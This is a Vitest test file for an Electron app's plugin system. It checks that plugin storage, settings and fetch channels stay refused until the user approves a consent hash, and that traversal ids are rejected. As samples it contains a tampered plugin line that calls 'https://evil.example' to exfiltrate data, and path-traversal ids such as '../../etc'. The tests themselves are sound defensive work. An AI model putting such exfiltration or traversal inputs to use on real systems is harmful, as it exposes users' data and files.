import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

// The capability channels used to check the plugin's MANIFEST only. That made
// every installed plugin — including one the user never activated, and one
// whose code or permissions changed after the review — able to use its own
// storage and to borrow the app's network identity through IPC.
//
// One userData dir for the whole file on purpose: plugins-handlers caches the
// resolved plugins directory on first use, so a per-test dir would have every
// test after the first read the previous one's plugins. Tests isolate
// themselves by plugin id instead, which is also the real isolation key.

type Handler = (event: unknown, ...args: unknown[]) => unknown;
const handlers = new Map<string, Handler>();
let userData = '';

vi.mock('electron', () => ({
  app: { getPath: () => userData, isPackaged: false, getVersion: () => '0.0.0-test' },
  ipcMain: { handle: (channel: string, listener: Handler) => handlers.set(channel, listener) },
  dialog: { showOpenDialog: vi.fn() },
  BrowserWindow: { getFocusedWindow: () => null, getAllWindows: () => [] }
}));

const { registerPluginsHandlers } = await import('../plugins-handlers');
const { pluginConsentHash } = await import('../plugins-core');

const MANIFEST = {
  name: 'Demo',
  version: '1.0.0',
  entry: 'index.js',
  permissions: { storage: true, network: { allow: ['https://api.example/*'] } },
  hooks: ['app:start'],
  settings: [{ key: 'shape', type: 'text', default: 'circle' }]
};
const ENTRY = 'api.log.info("demo");';

const sha256Hex = (value: string): string =>
  createHash('sha256').update(value, 'utf-8').digest('hex');

/** Installs a plugin and returns the consent the main process will compute. */
async function install(
  id: string,
  manifest: Record<string, unknown> = MANIFEST,
  entry: string = ENTRY
): Promise<string> {
  const dir = join(userData, 'plugins', id);
  await mkdir(dir, { recursive: true });
  await writeFile(join(dir, 'manifest.json'), JSON.stringify({ id, ...manifest }));
  await writeFile(join(dir, 'index.js'), entry);
  return pluginConsentHash({ ...manifest } as never, sha256Hex(entry));
}

async function writeState(state: Record<string, unknown>): Promise<void> {
  await writeFile(join(userData, 'plugins-state.json'), JSON.stringify({ version: 1, ...state }));
}

function invoke(channel: string, ...args: unknown[]): Promise<unknown> {
  const handler = handlers.get(channel);
  if (!handler) throw new Error(`channel ${channel} is not registered`);
  return Promise.resolve(handler({}, ...args));
}

beforeAll(async () => {
  userData = await mkdtemp(join(tmpdir(), 'onda-plugin-approval-'));
  registerPluginsHandlers();
});

afterAll(async () => {
  await rm(userData, { recursive: true, force: true });
});

describe('plugin capability channels require approval', () => {
  it('refuses storage and network for a plugin the user never approved', async () => {
    await install('never-approved');
    await writeState({ 'never-approved': { enabled: false } });

    expect(await invoke('plugins:storage:keys', 'never-approved')).toEqual([]);
    expect(await invoke('plugins:storage:get', 'never-approved', 'k')).toBeNull();
    expect(await invoke('plugins:storage:set', 'never-approved', 'k', 'v')).toBe(false);
    expect(await invoke('plugins:storage:remove', 'never-approved', 'k')).toBe(false);
    expect(await invoke('plugins:settings:set', 'never-approved', 'shape', 'square')).toBe(false);

    expect(
      await invoke('plugins:fetch', 'never-approved', 'https://api.example/x', { method: 'GET' })
    ).toMatchObject({ success: false, code: 'forbidden' });
  });

  it('refuses when the plugin is enabled but no consent was recorded', async () => {
    await install('enabled-unreviewed');
    await writeState({ 'enabled-unreviewed': { enabled: true } });

    expect(await invoke('plugins:storage:keys', 'enabled-unreviewed')).toEqual([]);
    expect(await invoke('plugins:storage:set', 'enabled-unreviewed', 'k', 'v')).toBe(false);
  });

  it('revokes the grant when the code changes after the review', async () => {
    await install('tampered-code', MANIFEST, 'api.log.info("ok");');
    const consent = await install('tampered-code', MANIFEST, 'api.log.info("ok");');
    await writeState({ 'tampered-code': { enabled: true, approvedConsent: consent } });
    expect(await invoke('plugins:storage:set', 'tampered-code', 'k', 'v')).toBe(true);

    // The plugin's code is edited to exfiltrate; the digest no longer matches.
    await install('tampered-code', MANIFEST, 'api.fetch("https://evil.example", {})');

    expect(await invoke('plugins:storage:keys', 'tampered-code')).toEqual([]);
    expect(await invoke('plugins:storage:get', 'tampered-code', 'k')).toBeNull();
    expect(await invoke('plugins:storage:set', 'tampered-code', 'k', 'v2')).toBe(false);
    expect(
      await invoke('plugins:fetch', 'tampered-code', 'https://api.example/x', { method: 'GET' })
    ).toMatchObject({ success: false, code: 'forbidden' });
  });

  it('revokes the grant when the network allowlist is widened after the review', async () => {
    const consent = await install('tampered-manifest');
    await writeState({ 'tampered-manifest': { enabled: true, approvedConsent: consent } });
    expect(await invoke('plugins:storage:keys', 'tampered-manifest')).toEqual([]);

    await install('tampered-manifest', {
      ...MANIFEST,
      permissions: {
        ...MANIFEST.permissions,
        network: { allow: ['https://api.example/*', 'https://*.example.org/*'] }
      }
    });
    expect(await invoke('plugins:storage:keys', 'tampered-manifest')).toEqual([]);
  });

  it('grants storage and settings to an approved plugin', async () => {
    const consent = await install('approved');
    await writeState({ approved: { enabled: true, approvedConsent: consent } });

    expect(await invoke('plugins:storage:set', 'approved', 'k', 'v')).toBe(true);
    expect(await invoke('plugins:storage:get', 'approved', 'k')).toBe('v');
    expect(await invoke('plugins:storage:keys', 'approved')).toEqual(['k']);
    expect(await invoke('plugins:storage:remove', 'approved', 'k')).toBe(true);
    expect(await invoke('plugins:settings:set', 'approved', 'shape', 'hexagon')).toBe(true);
  });

  it('rejects a traversal id before touching the filesystem', async () => {
    expect(await invoke('plugins:storage:keys', '../../etc')).toEqual([]);
    expect(await invoke('plugins:storage:set', '..\\..\\evil', 'k', 'v')).toBe(false);
    expect(await invoke('plugins:fetch', '../../etc', 'https://api.example/', {})).toMatchObject({
      success: false
    });
  });

  it('still lists an unapproved plugin so the UI can offer the review', async () => {
    await install('listed');
    const list = (await invoke('plugins:list')) as Array<{ id: string; enabled: boolean }>;
    const found = list.find((p) => p.id === 'listed');
    expect(found).toMatchObject({ id: 'listed', enabled: false });
  });

  it('marks a plugin whose consent went stale as needing a review', async () => {
    const consent = await install('stale');
    await writeState({ stale: { enabled: true, approvedConsent: consent } });
    await install('stale', MANIFEST, 'api.log.info("changed");');

    const list = (await invoke('plugins:list')) as Array<{
      id: string;
      enabled: boolean;
      permissionReviewRequired: boolean;
    }>;
    const found = list.find((p) => p.id === 'stale');
    expect(found).toMatchObject({ id: 'stale', enabled: false, permissionReviewRequired: true });
  });
});
